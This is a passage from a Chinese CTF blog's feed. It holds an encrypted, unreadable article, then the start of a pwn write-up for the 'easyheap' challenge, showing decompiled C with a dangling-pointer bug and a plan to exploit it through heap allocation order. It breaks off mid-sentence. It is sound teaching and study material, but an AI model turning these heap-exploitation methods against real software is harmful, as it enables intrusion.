d6hbO3jFtxv18mbb+RGrnfiIlY1g0EKOXpXt4TVEuyR1a3e3CllsJS8k45GxN80Fi5U+1jafkjw23MBb2a/DGDJuC7gWZ63OHMQSdcjF0TfN5ylEykaQ2pTAswEI6XFYtW3vfAkRrn0e6NnjPGv1gzydPrYazy+gKEXXsE5UitfxA/6Hi7ldb8IJ9MlnTRxUh+ewWIBUggUYRbjSZk/4xmydyDWVQY0wPfgv1Pt0nn4bcMdiQdym6yDcShxSlAMFm2SBIAV3b2+ySiq311xnmGY3cawBu6rhgd/bBd51Q3rZ9wRkfgI/CBiDIxwb6ELzpF1MMVcDAxc3IH5a5KAJrftDJEHq+bpK1ku5/WGwEMSjJh6KCfd66Jzc6djvkD/vji/YRLIdQW7e4ExstTHKI+UMwqo1Hj107Mx4xg94oqpxOjP/bOUkMfSNqXrFD9XwjEmUMIU3LQTYH0ds7hLWfPbr3Xzgi8cWHEg5tWVtRNES3ThnfwxwlTjibR8uwIV/0+ONw6YeCWMTSFPjBCllTFjBR0ZY6ZHqH5cSDV5RSKAlWbATT/xSvinp/D9dL5TGQA8UHMnEiACgmVkj5Ozix6CCK9CFKBPtu43gB9jqS20lFmZUtWFE8rKWbuobdjpIEdBGbwiFGt01cNCME+/Wqk0mzadBeMl4RllAWTiBFKAkrjegOeKQ2WONnbyxrilulN53BzHuRx3p3G4tDpQbvX0RBo8kkrDW1ruiWyr1jvM2vd5ycW+kKbM47dWKyTYPqLtLWvgIB3+SVJ0N16l+rnbp6VDyship5TgUPu4LDqkUx7pp0f8Uz4VIosJeJhrFGx1Qi6VOIB5QFpmCp7Z4SMDl+RaE4HK6AipwHx2Pg9nnwcKKH/iQBfwJ1XLiQOJxQoEzGLgHBBqkrTn6COYUWxHH0KWxmc461xJOgehiipBJMz3iebGIP7U0u5P5lI03ZoWjzIHi16SN5IrSgwlsSQBp9izEMaEAaNc+TVbDE3yh9woPJzhBoxvIlDXK0028UdyV93HykmIj4Y+QrrE2dt97L51VA1rYOErKUUDiNgAHTgLPh9iOq5ouDN71BHIWQAZm3pS5CW1K2+qua87Z/yTbhfSp7MVueIFuXVNYa/nPBS89a54OFUWgTIXVLgmV/XviDxVwL0CiM9TMV8Hlaqay4SB3HZbOP3/RSgP1FqN3Pqyf9Qkuf/di5nfGmz+DjpWiIEStFHDGWkFKnATTEzUrHUDcw3ko3hbSq/v60LMSvJjTDRx6zwzysCUycIAk0BAfkxeZIkqL745R0ovMK8XuTn6rf4r7jwUPJenFiMN/oPrNl+nDQzUFb4b1hNJsYv+8jAI3vrkyXiBZkZnU1O/QmfvFSGBJElDxP3b6f/4gtjsTMuvLH2jYC7wYB/YbSCMjSc4z3w3fKj3gw2tdKBEBTbhDt11CxTsAeP9MywdTyzZMJw/JPPYvCsfYahZMwVqVRyJxgGJGdYHrFRr5R42umgx9dcCoK9ID+fi0lgWl+uzNsuHdcmI+jRGVKEov4Hf0Mgrrl76YEtL1Ryr813xUDVmckSq61FtdC4MQcjy8m1D3ZLb+3x9zaQ08W0BjQAtcqZqTEp59zNAnPhtZYpP/6qJFrgYzbzE9isjTNyHTOdRoy0trzZHJvN1T2lXq2QKzT8x4FrrwmBMTiit3Svl0vWpgKJkze2D6pAsFqhbfKXV5e1q4rv5VkzD2nG0yhg64gIBNVoR6NKha2PLlhxJi1Tu2Fu2z75w86wSSlq2TJpAVKxmZZXoipBRtG1jygVoeWvQ9uoFVzPbOiotLs+0TMDMrkZSRZUMgbiDodMSZBsZAD17RdWGrqrpDw9TTkXwZVUYz9cAEyFAeEuN41HjrMPxe++rOxhAlwy8rSdIJWCfu51paobi8eJrjeeq+1z/LhxMmoPEiKnmhBMdOa8v1Zk4qIXjnjLJKizYdzWndeaYO4klY4Lh9L+FtJ2dh15wVEIaxyVjUoyY8RBO1wjiMh02o7BfqdwuTx1McWZHzpp96Oix3iKnmjIV268bqVFOPnFDzJt1XpcQxryhIOGEvwDfwl0OynoTu4oJ/q94Ys/kjBdawMmBfRImFZRzyW+HR8AYpmFOGC+UZkqOPA/BqPc9j7vvpUonaFAHe0/nZii9oBtG5dCcp42pVan7OPj/uGrnCXmGTDn/i1tYc4wJ3GrNwPnmM/LkY89P27kIL0iOOUT3FDzFXbZjRDx9uS39sEIPuSeVwzDt1bpx3uxq1gI3UWf79g/rFq9lH/e/c1WMhU/CcDY2fmK2azwJUYzpyQvQeoUNH4DOSq3uyWanHeWwHxohTKpIX/muZcEd6S3UFVQlhmzmYywPt/82SUPrSKkQkjLtTpWiDjKb+RIvAgGmk7/fkSKnTB92fu4hQm3nrXNkWoE63ztAfpZ19simAj2lW2bM0D6dsoIyps74Xt/2KHeCrNqbs/hvO6QAW1i4i9TBsN0HNf3jlUZHWL3zGhy4lwU1f+/CTSnM85JdYSnMzn8me+Th/xxIx/LVaCU84Ytq8OcgG2YeGnkEs7t2p74uS8fjPdl4F9vqcXcUHeX9+kBDbWl4C/f1sOQToF814cNhIoYqBwX1aYvE35SnXYZ/LLOIDQG2r6tp79+bedFZNIWnAavSa4Cv3NcxRMwKJ0oXVrVejiBL1UfUpTkxwruZ2ZKNhWm89DP6NuTquplKemC0dRFeTav09bygaJVdi8bcRpFw9qbEjlfcQg/Hi6HmxyzYXtQuDBaOPDE37Dx+qAp8kDH4l9b2cB3GH8A2E9cqTTzi7zw43EDNRXczhWbEos2OpdgcKF8zQ1Vgtzmv5phtAkSCC2DQHkhCTYWUtWrC+nUTPu2Aca4DFV/j7Uxl7T+Oya2/JU7O3mQkZjc75S+lHOZjlNPZ5xHTFwQdjbjQqDicFJfN49GxwqFgmUIuV4f1ogJ2l4RDB64wmYoSrc3c0GQNgecT/Fb9s5cFLmNZ1SjMa+1cbNQ9hFpUiBb9EATYH1OqgCTPaK10ANFTCeRr7ZSxNAcPzYNsAyoQ0tNz7tR9YJbBHA36cULTowEmSURmCEKQH7aqsrYrsZ0+OmB//jgis8Xa+eJm/4G9REZyBoocUpeCh+gxLnfl0EeYs9MEtQLRlBY1C1iBdAoZkvKMNK+8hIF5FY2fmGPzRt7zYLVUAQr5PhVvcMCKffiE7wOrQWSBrN9Cs8fN8C66IV4rQw0sotPp7Royge+zuhDGf4qmcIgvrBU1H5BaQsBNO1AotG/JcbW0+3s1RnhNSoZ3ZUX0MWZg5gXcVTZvtYNr0AyU7kPCs86wfhCNyxBd+vxRzYkx14diTBY3iVF2xohI66p2D+4e3l2B1uy1hfSG1ekoiBJkPUHGgjMKV0fVuYdQ0b4U9hR6yXbxL8N3WCPEQdQa3HB5gnGFH2drAJ+yjU+Lj7b4gZCwPu9scKgaRXNcrVAFd5iAOublV30OGsIDTOfMTLWBHDovORlg69AwpAsl7yl79pfRWPt1M/bXLNliD/+vQQWLt+8+LX/flSz8aeVPZ69xggSqyseYra/a7iREKtvvPwkPseeMdS1IKL34Kfp80FlWLIWi2aziU1Ve4+TvXPREd0E/8ysYMXh57ahrXCg4DH5eK2r11hADboDa0J+ZSEC6b0IPwFcSqLwcZgAMAJWQq9mR95Zdzv3ubvK5ooziuPxh6IHQuKnN4mwXoxyhtVxEWPtSQjCAF8HEO+eZUd/8P5rWwyb/+lw1CsL4TG0PT23zTANGKKp45Z7gGtV/+Jlh9FoiPEot0lKXmKkV5dinn6A2USLXaj4StSJaqJHimYVFFudYH8Mb9HdcPiAz6dAIjgfFqX8nj9wntcYqLBKZBvWZZUCJZm0+G1xqZJelXcHPD+zKE8AqtlZRvA509U04tLv+QRKAwx0hNaKgUAdhlVkh1aQ5PvYFDkwERBSNm5Ybt8fgJrM4FjQjQuwO4Ru6xgjLoq9SBwkS/vkwdLkbJ5+svjDZfIefSEAesZ7lRurIjvWyo8QPwB4ogahoKSz4e81aBg2gVs+zP6a0V7U0okKmM0IwJB762vguTzS8zsut2ENZgjms4P6YuYWTLHOEveoPPgVDMGUf7abB0/RtS7fK7TG+Q4RevFYrVsIdPhcXPiTfIMyfUSH7Zp2US1jy9ufQphicjc3RLgsKhGt9U/kRpY6f1iWceGTq06x0YhObpm0K7DKZmPq/1zYVKK9GRxKKONtzkf6ko9u3B0TzeltuAXY7gSrCzMmHIGhGhcCEp3YJqiXmhjcRQ8irkLtevBT1WO0LJvLlkWJg+r0Q6MSgEBRKPGnM5z0Cwg5S3XLLFR3F9wE+qm7Rd6FAIsMtfSj1iDJqmxT7iXXAyuZSemFNLe5vYqCBY0hdesswZFc4pWivRj43uGJ7SUUrG/5lR7vV5TnF5UXljj6ZZMkjRsgp9NozJb14LD4eZpq3sq8o5CF9N1i1xIkB5fQqp3Hnd8iUbxe8CvO8YXJpoS11nO5xPjZdlayAH0/2NXisIxBvBkqNoBt3PX0wqGHbaNNq26PkMAjANDHksEQNF+dzSO9yaz+g8Kcsx7NicjSjmF6m6PtJwrM95Tf3RHh8brUEVAmTfpK1YXJoOpu+r0cE2eObiI6x/aNshZDvCFhjY3dHxe/ZDkpKN42oHD9VEf46FGhk5n4Lc9tTmoo5vUYUMCDDrkY1jj1JGBUgmUp9rYOFxQ4/UbaRJW67ObEce+GdStO+ezSJ4V0Izx2j3LcMMwOU2R8bggABDBTA7dWzWwVZGkDAYzPLXm8KY9fcBN7kG3KT+i/Nn9wslhK06h0C0VZUY3CLpt4vqk8GoMA+KZ7nXJgrlfX2Z103k5kceCay5CyERKpr1Kw+525hJdVWmivAd1wi1lsWzn4OW/GHxBPc+jacjkVJF46CxKMB9NQ5qA40EP/q2keDjQPElDDa6EQWKH0axLEpV99sCLqYZvgvx6QhErDVuaMN0VvlZZfOkK+/VgRTanqT+D/d4F6LyS3t01Ntlz1Bqcn1gM0/tqeixwAwD8oPFVlEfS8JOczNTooQz+uHS7AGBxaBSjWD0Z9Mhx7QidyTSZyCst3TDJ8LKRLbDw877im8a31tKrUEXfoRayMfv7wiD0hKZVznCA17BXhrXIpP11CZnerT25slFyFTJiGZp6mqAdzmjsJTAVLDBksNH1qxOyUh8huRQlpGlYdr+VeGJSP4hJXWrvxzwfFwcuCzRxoVkdfnJkqs+KlooJQD+H/zYsM2ZX8djsVVZZ9p6wEJQppRMcMz36NfhnFRBQZVOVe00JsIX5HlTdB2rijgH2uTTDyYkIDSOY/4mJ+YwKlhO6Ya6DatxPLLe50Ra9xbSL8GLpiAWTcS/bqRBVu68SbyMkXtTyAqzhzDUjscjd5yB/SxgSrrLUex3/dhSLhjjf1BHsNd2LOqVUt/LiNXGM+dWDvTrU6ydfToCE9yKQHx6ij3hbuu2aBhGV8NUmsrofYDBO242p/Yx0AXgdRchrsDa/VR0vkL38z9B04ddRuSXeKXMNzExpdf3EzsW7ipNoJmuVdTfYIIuVnV5g5747eLSygGI8B7Nm9N77XRk/T45O4IlQQxNpJ+4MNDwV7JqidAM6l5dRqtX1+s5tbIeb0CQX0sTM70ZsJYBvdoaGw625XXnmIP05Aot4KCvACfibwklNPB0wUCC0H+ijNCtbWA1BvGFTmiqeKy8XxtP/4wL2YXaS9mj7SUGIX+nDX7NH5/qBOv1MUiLkVPOInmRl0UAxHSYlwp4Xyvf5BIZKnuFLSno+x5ur4fVroHbIxblEQhZlsBf/Y5tszJjqCQjhnEq5NDIuL9bcE8m5VzsPmWRE41X3xOKqTuZS+IJt4Rnh7mB9hu2nokKNPkY636lnik94+9JstP6zbvn9YGjt9HrvCSDDMqMyV7QiAZpXT5IJKLB4qolJej25he6OTmwjkTDFBqwYjIjgAGHJGSfDfjw4v0/wWehLA4yGPBY6frySsh9L3uHw7Oj4d6C3sY+bWl2MvQx7o1cn9aDpv6PbN+JbscP2EgURgKA25MKy4osGQwYYqmpod3JTpEV+B0LU9OcdqUcdwIEvFt7k9knWCcKw3Z/sbL3/jRCr6cfOg4oe1pfMhNC0DiCPZVEiANK43PhyPo2FpZk0/4C35dXjm89llvlxG1dUAIVe5mZVQc4csoEvUxD2g4VSZEqy99a7OV4pWk6DHEY0fyaI5xUN9e7zy0DSqhU6uWBUIbKRGb/feGYxapqXyXYnazMYFbSE+sDdd32YZPgQ1N6u8x7pRV0SZnxXGcep9LzC0a7KrNmCQ+0aX4Otc9TMjWR5qAZ8sYK0NGq1r0H4GTTCbfDWRMEyvaouWOoMvjDHhcZN7l9Okcemyv0eUEcCOCFwLDerw6acn49w9vdftwUP406hrVJTOiOPvNlC6hMW1Xa12SlNQTWbJ2YKatLaTPSLcTDSGp/keAZAh6UKv9eeONMOI/0olPsC/aUzvm2YIbFp1VdIlXSzdNV5cabZzfYeRkcvkRTT+/Hz+XG/XrCjpm6HnqF2zWcgf95D00reuwXMrfp+xe3Q3HDZpzC1qMczjRaNxWKGMNi2mkYdWw8gkI7uYVIIyniCUsJ0AVCuKYdJwD2EtgqNLM99WzPaGWufZro1qvuNhSEA6XrwmVF6BCp4ZivdVsQvqMMJMmlX8H28cV/RgrmXOGhQOaiv5D0sXJFAEAA40tQ4qzK/x2bu7O0O8AhHAfaKQEZ/na7Y2HKBo4r+O9d+8CJZxS1U7hfib3iHZK7xaOXoioeMkXFlgLgXooLa9Aq2H+THvZ1Q2OrjR8+hz1OshR4MaV+5Wim0d3APrMKBguLQf/66FB4dEyiTPZFTOV+GqXVnSwgzPIz/yEmjUI7whQmXMtUSF2tPM4Y3xT0ImqyrtY5Q3eq2f+Ee7+VE7IAe8ievEaoVWFWTzfuk9WRcFhPQzCHSZleiqXJ0BYFDiThUtiic7L6qCF1S0VqgRF5841+HEcKjS9N/rLPtKv0W0IHZiq5wR/ZcwuszdZRT11+Ibk+Z21LSoxWkzbWPTNtDcsW2basbQ94M0NZ9QtNp2N76if/OVsX/GCmFtknHzMBFKlW9DlcoJ/5NzWuHWmjWH3apn9pxT+qmU2Cx57LKbu5Y5o0yhv9lg11N2aduPS9z7rOXqRFmCQdUiNgx0sD1FTgh8hZuPbLUvYQVd0tF6fpqiVh3fjM+QqBaMytIIZRgsqcJv/XL/yqfXKxaiW9dk/tf4L8FPhZCJJZJOnFjeVKJyZ9PSErZvfDIFqS4PtXqZAXQTcuSMVIFjrGtcS4EzeoMGnaifcGMHcppT0/Gibkl2fiSyoDHKd0aP1yPHoCrRZiHL34tsPAeqedZUFSom9bnPBYiNWi4oHrWw31YWklU2jn7lkCJ1Adcmj4LLN7vLxEIKGqqqJnksoywL9iDY76PXSN7SL8Duv23PJ/CpaDy4nI8DJjVPhPRbo4H+9Rek0COnImtkFBNoWnTYcbRpEDeka8b+4tuqvMRlhoCdlzv8QCUB84jOUZ/qCbgiGMW/AVnbuHGDGarAbXWbJFpqHXaO3iwNu0XofyCiymWG+1ZTrc/yWbESzqg5ssfdY6EOxofgiTN+kNKYUFzJDLJXhCBtMJw38y0uZ35Bcm8jm3IXc1W5fbpBIbXiHNhA9lAarAJY7SSeRXRZ7v1V03Jf9U7X9jkL7PRXiawdMSaSKJLzUdw3ix1y2YCDomY8QJZrijTqArkF/JSbjWmoXvu31wYdAaF453V+BJfP4/5AYfEU8JUWtAYYaT/nImFXaxoDIGkSMHIvmzbd9upHCI8MpcXYODkF0u8ChEfKhfVwtyUE3XNYu0mra5W5XAcVFCOCMvx6/QCeMb+UEpMRd/PMZwyLcFP6cPCPAo3TqnhNTXSy4vN4RzcvbBG7qi+zAxrNV9ybm9fS3LSABXybG9mep0ngBGw/y696v7HnGP7mEgtANhwwqMLMG0X6AbJi/Yq89pFOp159wB/QoXCdW1Nbz6ft0XW5AP9Z/rJ/7Z6A8jcbE/+oQnXW8IqDoPWAsRTpYuXr/DR3laC/P16T+sbNR9Fxq9XzcpvWXaT1PHo3QYw0smzBbXr83BNIr6qTjv25d5LT6BhgVUInzcTrDf1Th8sFYWhC7t+024qQtfrB4ZNUe6Z+nCf7x0XYejdZ4RHjOKNRxBkBPspkWqWOLqUBhPylvZFrqY5pSnkRAxXkjWkpAsXqJoZRCPYZvjlsqZI2up+DnaGWIYaBLhpTSBfET07oJKQ0sdLRTD4G4Yoo9L8mAjr3TY959zzqZnB1gZro9lKcojohKW/cx/BTFXND0ojQHBdIuT2DwHLIe5a9hu5u/U3eNlgD3UKrd1aZwyZtFbSgvwPp1aDgqZp6RurqXyM0sSXbb3Cv1lwzRnLscMQjyeMkZo171Y+aXN4qV/baGbX5at8OsEsKzouvrKOTCbko7bPgf0buG0TrjzMLVLwJR48UFPai1m1lul/yUZSlE5mgeYP7gFCWy1pTcCZI6gouDAIScPYaAG2sMgJt4JrSLgSseKhVWFlTNilbyIYwJgHnQfPYg2LJc9NdNp5oxymimJNr5n9FlH/hdUSuC+XOZGJPkz3LRJ6Qubnb4PRswuvP2EISmlR3PU+F7eHrwQJRQKheU/GdWSnolGDjF2wEYpLE/MrH0OJQDAVgbx/fHEUj9CeFIVFnBbUz5snRTPAjww9SnDjdfD2L7JGKyc+p8nPDEIv8SgA+Z1zkpSf91VGjDhV1vLxGEofETVEmign9N2KozQAL396TaG3WwCnsNyM1l1vv3MPAWoYb4As6xR62zrjFSNbemK1kK/TiPDydwZj01ZKrDBg6dTxkJALd616dhpJ4dmApiM9DSgSpTDgAFvPSz8W2jwIBmWhKMdWbDTXhi7ipxmvnxxswNgkbd16UvZoSXEPFHDbGeskeUB7KC4vO9SD/ZgL2mIsL1U/oW+ubIl5bSbTa23WvBVFa04rMKXFN9q+FOhkZmCEynbyrJAv3p8VWPBHZjkQ24Z0ytJaMa3mpurWSxg0+5qdTsliNzIlSLjHyMCXNC+4bJJjxGMPyNnNgWidb+IdsZjOAJuM/Dyj2BlS8sYAPlZgzPmsOTFzRyjrxZcSdyzbkPDJjHWALkXikjsY4apd8Aq7A5Ek3CRTr6y1o6DNWCM+5tvYTJYdHLaAf7ywKLXF/El1CQ+nTMV5dXkxP2OB0ebS1luILicSmXMH/aQ+1ZCV0jJvBMWBSjt7YaSybOMzxBX2P7N83P0I5gtaNXBjKBBsHs7+Nh6wg9+v6CTjh0zTSjhAE1FQM4ZogNImfhDik9xYxytXFX9Finf66BmfYvGL/2h5EPzVnqDCbRbvMvSi1HBCXPA/0PXwCne4R22DrIjLpdA+ttcDdJd2cdM2UKY3H4zhpgjoB+o6wI2sM8yRv9hf5eYSfwomUnRmq43iBO5s7+iOTdbsqckie/VEhX2iL5Wa3uQKAazMvKOdXodb7LuiWywHsZJBFZr2OhZKINaoIgN5G/W4NVDAtQHYxc/1gzLMNooUdGDRZoLmiRMKHZsYMlzHdUqikDx7Rg2Y/KZkDZTjoiq2LyMZ+RMbbRR4O2M5WZGcEaJmm0lB7jLCpwUYMc7cWc/ydM2+dgG39HV3pmA5PkiK+BwCSAGqYE7KwFhkud+7rj2bUDGchfll/fECE9bbty7wa8/DOvstQaCG6UYqFWobtBsw34OPKi68oFRR/uzn9QNY6sb7Uib19EOOaZrLasRDJgnUaIp+ZBvE1TpZBwFcO9OHE83trt82u29SZuwQPujl2pEXwIyOqwVVYPs41JkRzT2Jt7MUT/sOy9tGRjKNeu+7icihftyWF3oLGSPLjFKdr1MqY4TTTSZBKotdAc84IgCoRI8Xj64pSqVYlJE/oIj2/FNLoYM0LG1stanZ7rX43EPs9+zM9+O2EnclLfQrw8DjbP2cUzBKofGsd8q7w6ht+X+fsVQ14+ffSFvwecAtRfNmIonTQhioV0l1EHkDEjZY3jpoLJTauok6VzKdL2pxysvE1owUlg/J+WGV26NZiT5HtDxJmzTnphSjuSN+rUgo9Fwb5hWleCHBNqJyCMVE3tdlaYf9Khy/UWgEAkEd0k32yMQrHRO9EgXeEJ95GZpP6ZukG2wL2Bo18D3oLcTLM4NLx7d/BgGR69qpEhvsN8Sa9snRWYHo2fm9UNwB+6x/im6wordeqcE4XUA6QWGUvW37IZggIlYKX5zsv/ten7vW4f6qOcIwWB5VuxEQ0JVbsyoqSrkKz7aTW6GUMkBDAtVqFXM2Wo3lGyZ2GYJtslQWY5MiGDFRcKRJz9D4/mKcV8klll6Cgp8dt56ttpo19LatEjicSX6SzERWgX6nuGEi7tP2FH9diTXGdkPAneOlrAQ/PkTEpo2H8J70qCFzPFDokWZgBITq/TcrL14FY4ZCwVr0WH/FBbVlcnLJEhszfHX8bXp6CtSJGSOGXtX9X8PBffm+ZAZTxZL9PZj7Vq7/6kyPVVUDpVmssSzsMqVDYpEadtTyyk7jDzBg4RV5J+9wGxgSBzpc0w8wqQDbefYOBc6I0VJ9huc2eSU5hAL59zawhUhGdeWnD3hJV4OndffgRqX+/Zp/P/Lxp97HURRIRHflJnD6pDUjwoRpp+xmKTHb834Pl14Q+hGQLuft0eZJM80E70XIAxguqoBQWmi8wgAjtl3BxON4FSX1agqL/MFAUEijSHWWLe3BpuiLJzg6iJ2wc9+cDhM8DjProINPVIWUNLmod4VKoAoDuP64c0k/g5we3VCJtbBPEt1zv+qh8QGkm5OvoJAMLh0NgS7NG+QXVmhOIXdwfnLIoQY1KmJQouyHZtGoF0x9pDfatEjoH6T7O61cbxkTFZdySQ1mJvG00DDlMNo3nB1b+iPe8Figm8tQFWaBD/vAug7ckDPQRJgriGNH0aNRDOu+9KVLQPHMhNAqLPrkgIEy4A0fQFS+hxOd2lY9cWYSjhszS+LUyY49ulfnS9vH/guqV6PhqFp/W74JDvaQdSY9qwRb9zGIMvxBjVIconfpfQiVHEo17+CuG5wHDvGBL6FPM444t3fmG2XsFM3spbjFRTbJtuQWYGCId2X+GnsWhhq11scfEvDdgx+Qd/6HjXUS1284kHgcL2uWSIHOkcTsyMIC7Ypq4aWKZkGM/GUez8fJN79m12pKbSR0mEN8L1RRaFiqDCSypg9XHiaTflmhd2rDYXIIgH66P7EbQWkN/cE7h/Qte0agKMeVEd8zkBCXWYnnW6NaA77uXnr4zgjjybMl+W1qmoObQ7MEJc4zmSrunDHhgn+dnj0HdiF3PhneB0kzF3TsZuLPN1UV6oAeR/CEVRMZ1DKcJIl59F0F5hYaW8fQNaaSFh4xwUsOWn5pCLxW5D1CiUm1hctrjGLhaKQegKsbcYDE7JizRCeCUU0GCm28IvzQuZ0ifavmR4GL7cM+AutxjM1+pCkUs8XtfLOtU3lWCtqhpBv7a0/2R4o5epMOb78IcfznHMpjrs70bkqesQ9Jfhj/WNemTg/1ViRO/nbVX0Rm3FuORa/Kgq7iRcptJeBrBH4D+yd1YncECGDo2ICujFpV71osHsbLupq899ukEk/O6gwTVrkiQwVR6tnTdTponfI4WWi8f/1/OAmqgyEJDNE9J2otaEhtD4I1pMIrEXlV1VHuJoTVj1CRDc6XxymxD4aSYhz9C8dZMN2boLBO+CQkaBLeiXMOnDlWML2TWkkiC85wh5lB6Rs5egDKLh74CzaSuVvdyWQJiEVyK3p+Dv9CxOrRFUMhQVG+oXDXptwcwvmGOctSRQXToiJSF95MfI1Aprqbb/HZH2O7S9QGfUuMsIUAO0HamhtgAVdMQZAoW+GXjWD9qSPk/sGHce+NwLQ/0VkA0/T0UQtqT36wtLF+CMD3RH9UwloLn8Begx2RuaoMMT4MwaArobSkbjqIvIXNh3n80VZ1w6Kzq5a/9wYiKFlXL7UjsDW1rhcb/wWImIjOwObsmMAxdvirSHMHrSfJDXuyi9UYTj1oIxqEZu6shjWWty2lk8A7vxSKMAAQmn4+GDRCtnXkC9Uwbq0sl2i0nn31HjzNeyu+Ju8ZLIXYG7aJipIIcjE5f4vnNvfczTsUQS7Kxh/l5S5ohfbJQuscP0CwZl+1PFYXnTlQyHpS/qwxc6HJhHvRKOHXP7pOAavwfIHBoWwUyvqbk5A/5XWK+WjXuTTdUE8vVt5ft4F0rUFb5VDub19rDjyfxcR/tK6s+qJotGQwbe7WIQri+ImzUEopeJpKq8xAteHu/NQNDlCuBKGANSBfrrPgHTf9ScW41DOT77qW1wQ50+QD1/gvq5zXUUyiPW+2EO8IucDzgz1oTu8QaimfCJ2f+rU8zoFvrvuGyx9A3e9/HkOVx3XD1S0R6EaBHZpKFpKHc1ZjptuE+lt6p5UoKcea4qtDSbBbBt4Gea6V1kmhegkZArS1igQfrcYK3Q9fcoGp7RGp75gwOVXm63fwPlH6YsvEmY7XRx7aR4ahTaA7rFIsoAUYu7+1e23FlSHp1l6cktQ6Dz9xB2iJorS9108pQXEXD/kTY9IcgEuxUnNNgdB9k7SjxoYlcdtuy0ckYuKQsAFZUqebIEKgjLnMKs5+21h+16S2rrjjRepAZufzpsHcIGWeLh02lnQ423msRqgCpO+MmwKx6r8GSKG91V3/hsy1jziFL8O+J5Zh3JRCTi2pqhD1oRe6Gw4ZXFdHFfq4eNLal0IXVhZYgX0OMGnUZkXnyDj2quziVE92VNs1TCgs9Ei0o1ezEN1xuTZSwR0fHYh7FoztetXP39IQ0WJLJo1siCeH5FANTr/q4nycSC/i51GO0XuqmxRI8s3QMaeTnapP+wzr4gRRG0zRIOr03W5jw68/k4DcFNvgJAi2uL+N3ujwqlIToXKgTv1VBYjM6KTDaR8bgWdmAHY/+iTSEjMM/ZcSfa11xDWVRAUiiS/+QVWxZNhDmNE92BhKLclIISWVOmdHRc9DP02pmCAl6Yf5snggfgguuCO3idZCLmYNFN0wRPOsuJ1y+5p40fREz2Jiv28LTeNdwlWM+nuM/VGOQQjSfMH//lAszaRnE22oj7L7nBdyoEwJ76ZF0Hl4fFKLoD55c/PmIIe/7SBpGF2IBijz0gByEadeh0goSQWJVl+SV4b7Nj9llr6tmrBt4JuAJx7uddOB0EqtIe7B6V9F4JFcUW9xahEvk0JkeWF4mj7Pa6N9lW239UG9I3DAA40eOavZds1Y77+Xd0OHqtA4FUeuD+YoN1aJu6LiBEhKbIEKuXulz6dI1CnJPPXqejnlIxqolNr1cLm8c/gGM/WO16wxgqgCJhYhwEWyGFGQD/4bxSMXkKStAEppQJlNUCshU6h0snzT8Js3CyMSuXhPCvzhkufOnG45cD/WlrkXz+MhEVQvbl8hXrn4uw37bNiHV/EdND+/rWL6nj7KGjcbdBB0M/JWptW3ej3WyGIoQHj9lhOej/qj3CArRIUqSHSNd57OOT8FYcmoHF1I4KBkClJpmwjR6XAPilL0vPyXOooQUyxpkD4wM/E+IB5miUxerK4E3qtd8dhlvYP41uwpmtcdghgfWg8LBm01nk5GUdROKgf575yIiYXZ8jzb6BTKt3BKjSVL+9Q0mMvV3a2dVO5BbbMDg4YHlTXOeI2w9t1BWwuhY85EJlRH4Rdruv1uVR7inVC1y8wpCjIEOLNqlbZSWk7feWKpjSSpLlDEyzJIVrCd83Yra5ZHhy6dSZE4OMjTpIj66HWAxbNibsmYN2Em9xbDsS1iWQJvjlplRCNxx1Sl8TVicZyBVtEdBgW+pxKbKjGix3oEJR99+ay7Ko/Y918E6Rd11BOKqufZEbVSIWNevFGD6WW3jY354xME5v5ywRQNhkNjfkyBGRG5zi7Deqi4qMaEKEKmAHxypRdDLKNiAUyaU1LQzto/UXXHKDxtipHAe5wTAu0ZLo24vlR3jW0OT/k5MY63JKzrNFuVgYq8gwNAF3R9lKV/a4eElPZD+r9GPAamAq8mK2J/t+kxCuauO5C8ejjRIrkI7s6g6g03gxDFW54Unuv8tzw7DcMuVYeA0ejwf6oP0/15RJQcqoTnJPRL87X5mMG1MqruHR+d8HaH39LSLT9iYTgM30ERJHxA4bQOQL+Noladvs= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size 